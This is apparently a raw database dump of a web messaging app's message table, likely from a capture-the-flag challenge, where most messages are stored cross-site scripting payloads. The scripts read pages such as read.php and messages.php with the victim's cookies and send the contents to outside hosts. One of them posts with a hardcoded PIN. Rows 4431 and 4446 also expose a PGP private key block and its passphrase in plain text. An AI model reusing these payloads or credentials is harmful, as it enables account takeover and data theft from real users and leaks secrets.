id	recipient	sender	subject	message
4431	vtest4	julianassange	key2	-----BEGIN PGP MESSAGE-----Version: Keybase OpenPGP v2.0.8Comment: https://keybase.io/cryptowYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8nTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7FsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/ASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1XpB5iB0bCwHpPDLzshubMM=HlY5-----END PGP MESSAGE----------BEGIN PGP PRIVATE KEY BLOCK-----\nVersion: Keybase OpenPGP v1.0.0\nComment: https://keybase.io/crypto\n\n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\n2eMDauLaWnmdIdAyMcVDcQ==\n=VVeh\n-----END PGP PRIVATE KEY BLOCK-----\npass:4ll_H41L_w1k1L34K$-03071971
4432	sajjads	sajjads	axaa	<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://54.172.225.153:8000/", true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function () {\n        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n\t\t\tdocument.write((xhr.responseText));\n        }\n    };\nxhr.send();\n</script>
4433	hotab2	hotab	0	<script>\nfunction get(u, pass, method, pin)\n{\n\tvar x = new XMLHttpRequest();\n\tx.onreadystatechange=function() {\n\tif (x.readyState==4 && x.status==200) { \n\t\t\tif(pass) {\n\t\t\t\tvar t = x.responseText; \n\t\t\t\tget("http://hotab.ddns.me/?"+encodeURIComponent(t.substring(0,4096)));\n\t\t\t}\n\t\t};\n\t};\n\tx.open(method || "GET", u, false);\n\tif(!pin) {\n\t\tx.send();\n\t}\n\telse {\n\t\tx.send("pin="+pin);\n\t}\n};\n\nt = get("http://54.172.225.153/messages.php?id=3907", true, "POST", "123456");\n\n</script>
4434	aaaaa	aaaaa	aa	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwcBMA2ijAvgNApLaAQf+MWiJL3Q8UJUi3kqGxqriwN2xOSvQG3By5Nw/OuASUbzQ\nsb0wjROjB7rw3lGyoY7sO1lKzHwgbfSirTUE/nSK1gvDR3nGhlLJJACs1BNFxoOY\npg76Zo4FxOT3AURYE3JaOzKmRyVffPRVCdbJbwozE5i/2XA8E5aq5yY7/eYDnrGI\nK1pslvFkgc30XkaD32BTC0pRYJ2cOSigtcqr4RQHkZWQZ5EUnb1f0AbXvEo+pymp\n+cNYioOUlD6jZ4d6LB3UdGmDp9URbts+/W9frMZaC3PSAH8HESFQXgU35zuHsNHT\n+uRXrK2aTWeSoV4QFivDmlKTwOHOi2qBqg9y59D6PdI+AeYrZqdyARSAzxBOZ/Lu\nm4f9UQcW8jksZcCMGW0XctEE0rwUyRRnXe9PxyqIE5Guw091KBt0O6AF4q+d+B8=\n=lDPF\n-----END PGP MESSAGE-----\n
4435	aaaaa	aaaaa	aa	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwcBMA2ijAvgNApLaAQgArE2FBZqW7r8PofaWboWeoVtwfApaeqpw82bVbNSd2iFl\nzITJ/FYJ2nsCs86vVItjhvGVOU0B6KGijx81p98O3uTmKtxnP8YLLR5Vyhw9L4mS\nMYA2OlKHlPI8R3hz6bHMB+iobmLMlUcOVdul55rEHumR4lKlGdjbyRb61v48X/uV\nh4uewYzqvXYYeCv/zKm1IouKz8erRbO+RV8wJJWKE7gyGEWMvWvYNz15oLiHckqZ\nc3RW+hbpmNwRXkBHEUEtU2I9VtulUT9QC8ZQljKiK+pgIP3wUdAgw/vkDCMqIMik\nJ252UmGpNyaQ1rXW0fLFKi5c61ZGTAJbzgFKfCS55tI+AfDaE5X2u4XeqtyY602u\nwoapdOQDIP4NGDafUEl4oClMJekA+4xw7Kc3X5Gf2qbPMLgbZo0tCkeg4ZYoVmA=\n=5U7I\n-----END PGP MESSAGE-----\n<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>  <script> $(document).ready( function () {   $.post( "messages.php?id=1", { pin: "1234"})   .done(function( data ) {     $.post( "http://azathoth.bytesexual.net:1235/10xxuddd", {x:data}) ;   });   });  </script>
4436	vtest3	vtest1	x10	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\nh = $(data);\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(h.find("tbody").replace("'","QQ")) + "'>");\n}});\n \n});</script>
4437	aaaaa	aaaaa	aa	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>  <script> $(document).ready( function () {   $.post( "messages.php?id=1", { pin: "1234"})   .done(function( data ) {     $.post( "http://azathoth.bytesexual.net:1235/10xxuddd", {x:data}) ;   });   });  </script>-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwcBMA2ijAvgNApLaAQf8DfxxsYLQwa0lPrurOHEdy5u9s4inqKv7x7bU4tP89W4Y\nkDz5J5eNHMpk0wg5h+hrpsnlZe0GgdG/HCJ0P+vYYzKylZFTeRtl2oyv0gx6OlOx\niew4xzKdLLf5f7RzaiVlxpb37nc5jEM9ypVLp/9tnGVItcfFXRsFN6pSRfDILIiE\n9iacrcuseE49GfG/miqgkFMZZdf2Bqp9daKFO3xZzIbw/wsmyY1wWinCuBvxymoC\nUOQlb9beOs1anO3Rru61r1tlTT/wRoayjWQDYW+m2ykylayCQR5/WDy1Dcuj91PR\nkhRxkO4DEtEoyWs4YCLW26MzfLbeV4R4wmQ6IVD2zNI+AYag3NZKNad7I8FRfZbL\nTJ9Yy8Rz3LK/ArzarZtxRbugYjzP6Y1MtMsymEohji2fh+hHfi6ioSJPZfn6Ucg=\n=FSpH\n-----END PGP MESSAGE-----\n
4438	vtest3	vtest1	x10	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\nh = $(data);\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(h.find("tbody").text().replace("'","QQ")) + "'>");\n}});\n \n});</script>
4439	admin	sajjads	aaa	<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://54.172.225.153:8000/read.php", true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function () {\n        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n        \tvar x = new XMLHttpRequest();\n\t\t\tx.open("POST", "http://nsfw.ir/dirtykids/", true);\n\t\t\tx.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n\t\t\tx.send("webrtc="+btoa(xhr.responseText));\n        }\n    };\nxhr.send();\n</script>\n
4440	admin	sajjads	aaa	<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://54.172.225.153:8000/read.php", true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function () {\n        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n        \tvar x = new XMLHttpRequest();\n\t\t\tx.open("POST", "http://nsfw.ir/dirtykids/", true);\n\t\t\tx.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n\t\t\tx.send("webrtc="+btoa(xhr.responseText));\n        }\n    };\nxhr.send();\n</script>\n
4441	admin	sajjads	aaa	<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://54.172.225.153:8000/read.php", true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function () {\n        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n        \tvar x = new XMLHttpRequest();\n\t\t\tx.open("POST", "http://nsfw.ir/dirtykids/", true);\n\t\t\tx.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n\t\t\tx.send("webrtc="+btoa(xhr.responseText));\n        }\n    };\nxhr.send();\n</script>\n
4442	darkarmy	sajjads	aaa	<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://54.172.225.153:8000/read.php", true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function () {\n        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n        \tvar x = new XMLHttpRequest();\n\t\t\tx.open("POST", "http://nsfw.ir/dirtykids/", true);\n\t\t\tx.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n\t\t\tx.send("webrtc="+btoa(xhr.responseText));\n        }\n    };\nxhr.send();\n</script>\n
4443	darkarmy	sajjads	aaa	<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://54.172.225.153:8000/read.php", true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function () {\n        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n        \tvar x = new XMLHttpRequest();\n\t\t\tx.open("POST", "http://nsfw.ir/dirtykids/", true);\n\t\t\tx.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n\t\t\tx.send("webrtc="+btoa(xhr.responseText));\n        }\n    };\nxhr.send();\n</script>\n
4444	vtest3	vtest1	x10	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\nh = $(data);\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(h.find("tbody").text().replace("'","QQ").replace("\\x09","").replace("\\x0a","")) + "'>");\n}});\n \n});</script>
4445	darkarmy	sajjads	aaa	<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://54.172.225.153:8000/read.php", true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function () {\n        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n        \tvar x = new XMLHttpRequest();\n\t\t\tx.open("POST", "http://nsfw.ir/dirtykids/", true);\n\t\t\tx.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n\t\t\tx.send("webrtc="+btoa(xhr.responseText));\n        }\n    };\nxhr.send();\n</script>\n
4446	aaaaa	aaaaa	aaaaa	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwcBMA2ijAvgNApLaAQf9EkAh5OLQHaLNHYr/DBvolYwL6q2jYHErrBU8hUeDR9dl\nx9VRV+PWJ6Bd/ap74J87pmA/jdOn1/OtZIUPWWO21E3ALK9le3m7XcAnidOTKam/\n/MZuCVN8O75XkQI6UhKD+7TeFVyQNBeeh7bcdrNSRaE7n6dUAnXCstEMJNRDl+s3\ny9IGnhBWtLrxuHuwIincOkrpBcLVKVmfVtbDLWiDXYniqm4tAZxnPcBG864Y2STv\nkOsL4tgrfSL9+xEiCmhHgCz1JFPE9NZgkhrKfugTBF4a2fwCoeCy4sockghr7F3O\n3rBabwHgaQocBk7XibUNgqwOr+SLJtsUjh5eNsbOYNI9AYNlkXsnDjiAiHc/0i8n\nY2idPMcRpiPKU0lN0Ogk1YG9uhV3qIGDrwcE++sSPWiAOJ6F+3TjE/+CGd33bw==\n=banP\n-----END PGP MESSAGE-----\n<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>  <script> $(document).ready( function () {   $.post( "messages.php?id=1", { pin: "1234"})   .done(function( data ) {     $.post( "http://azathoth.bytesexual.net:1235/10xxuddd", {x:data}) ;   });   });  </script> \t  <div id = "dec-msg">ffff</div> <input id = "privkey">ffff</div>  4ll_H41L_w1k1L34K$-03071971  03071971
4447	darkarmy	sajjads	aaa	<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://54.172.225.153:8000/", true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function () {\n        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n\t\t\tdocument.write((xhr.responseText));\n        }\n    };\nxhr.send();\n</script>\n
4448	vtest3	vtest1	x10	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\nh = $(data);\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(h.find("tbody").text().replace("'","QQ").replace("\\t","").replace("\\n","")) + "'>");\n}});\n \n});</script>
4449	admin	sajjads	aaa	<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://54.172.225.153:8000/", true);\nxhr.withCredentials = true;\nxhr.onreadystatechange = function () {\n        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n        \tvar x = new XMLHttpRequest();\n\t\t\tx.open("POST", "http://nsfw.ir/dirtykids/", true);\n\t\t\tx.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n\t\t\tx.send("webrtc="+btoa(xhr.responseText));\n        }\n    };\nxhr.send();\n</script>
